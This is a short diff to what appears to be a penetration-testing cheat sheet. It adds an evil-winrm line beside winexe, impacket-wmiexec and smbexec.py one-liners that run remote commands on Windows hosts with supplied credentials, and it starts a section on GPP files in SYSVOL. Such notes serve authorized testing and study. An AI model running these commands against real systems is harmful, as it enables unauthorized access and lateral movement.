@@ -188,6 +188,7 @@ RCE
 winexe --system -U 'DOMAIN\USER%PASSWORD' //INSERTIPADDRESS cmd.exe
 impacket-wmiexec ./USER:PASS@INSERTIPADDRESS
 smbexec.py ./USER:PASS@INSERTIPADDRESS
+evil-winrm -i INSERTIPADDRESS -u USER -p PASS
 
 Windows Server GPP files
 \\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
